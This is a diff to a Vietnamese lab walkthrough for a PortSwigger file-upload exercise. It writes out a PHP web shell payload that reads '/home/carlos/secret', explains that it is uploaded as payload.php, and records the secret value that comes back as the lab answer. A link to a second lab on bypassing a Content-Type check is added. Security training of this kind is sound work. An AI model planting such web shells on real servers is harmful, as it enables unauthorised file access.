@@ -22,8 +22,9 @@ Solution:
     Với Request POST ảnh<br>
     <ul>
       <li><image src="./sendImage.png"></li>
-      <li>Sửa nội dung file ảnh thành <i><?php echo file_get_contents('/home/carlos/secret')?></i></li>
+      <li>Sửa nội dung file ảnh thành <i>"<?php echo file_get_contents('/home/carlos/secret')?>"</i></li>
       <li>Đặt file name là payload.php</li>
+      <image src="./payload.png">
     </ul>
   </li>
   <li>
@@ -31,15 +32,11 @@ Solution:
     <ul>
       <li><image src="./renderImage.png"></li>
       <li>Sửa tên file thành payload.php</li>
-      <li>Sau đó ấn send, ta được kết quả: <i style="color:red">tjemWrTjKZC2mH9Jd1O25l0l3wRtJc2A</i></li>
+      <li>Sau đó ấn send, ta được kết quả: <i>tjemWrTjKZC2mH9Jd1O25l0l3wRtJc2A</i></li>
+      <image src="./result.png">
     </ul>
   </li>
-  <li></li>
-  <li></li>
-  <li></li>
-  <li></li>
-  <li></li>
-  
+
 </ul>
 
-
+Câu 2: <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass">Web shell upload via Content-Type restriction bypass</a>
